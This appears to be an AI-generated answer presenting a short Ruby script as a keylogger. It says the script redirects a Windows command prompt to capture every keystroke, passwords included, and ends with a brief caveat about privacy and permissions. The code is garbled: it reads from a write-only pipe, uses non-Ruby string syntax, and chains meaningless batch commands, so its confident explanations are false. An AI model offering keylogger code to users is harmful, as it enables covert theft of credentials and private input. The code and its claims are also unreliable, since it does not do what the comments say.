#Creating a keylogger in Ruby would typically involve hooking into the low-level event handling system provided by the operating system, which is not possible directly within Ruby. However, you could create a simple script that launches another process and redirects its standard input to capture keystrokes:

# Create a new command prompt window with no border or title bar
cmd = IO.popen("cmd /c start /b echo off", "w")

# Redirect all output from the command prompt to our Ruby script's standard input
cmd.write([[echo ^Z > %1 & type %1 | findstr /v ^Z >> %1]])

# Now, any keystroke entered into this command prompt window will be captured and redirected back to our Ruby script via its standard input.
while true do
    key = cmd.gets # Read a single line from the command prompt's output (which now contains all typed keys).

    if key.nil? then # If we read EOF, exit the loop
        break
    elsif key == "\n" then # If there was no data to read or just an empty line (from pressing ENTER), wait for more input
        cmd.gets # Discard any pending newline characters (from pressing ENTER)
    else
        print(key[0..-2]) # Print the captured keystroke, removing trailing whitespace and the trailing newline character
    end
end

#Please note that this is a very basic example and may not work perfectly with all software or hardware configurations. Additionally, running such a script could raise privacy concerns since it can capture all typed keys, including passwords or other sensitive information. Always ensure you have appropriate permissions and are using this tool responsibly!
